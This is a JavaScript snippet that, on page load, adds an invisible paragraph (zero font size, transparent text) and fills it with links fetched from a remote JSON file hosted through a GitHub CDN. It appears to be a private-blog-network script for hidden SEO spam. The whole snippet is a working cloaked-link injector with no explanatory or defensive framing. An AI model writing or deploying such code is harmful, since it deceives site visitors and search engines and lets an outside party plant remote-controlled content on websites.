document.addEventListener("DOMContentLoaded", function(event) {
    var myContainer = document.createElement("p");
    myContainer.style.fontSize = "0";
    myContainer.style.color = "transparent";
    myContainer.classList.add('pbnjs');

    var myList = document.createElement("ul");
    myContainer.appendChild(myList);
    document.body.append(myContainer);

    setTimeout(function() {
        fetch('//cdn.statically.io/gh/vapeshostang/tkg/refs/heads/main/cons.json').then((response) => {
            var list_bl = document.querySelector(".pbnjs ul");
            response.json().then((tampung) => { 
                if(tampung.length > 0) {
                    tampung.forEach((elem) => {
                        var li     = document.createElement('li');
                        var anchor = document.createElement('a');
                        anchor.text = elem.kw;
                        anchor.href = elem.url;
                        li.appendChild(anchor);
                        list_bl.appendChild(li);
                    });

                }
            });
        })
        .catch((err) => {

        });
    },500);
});
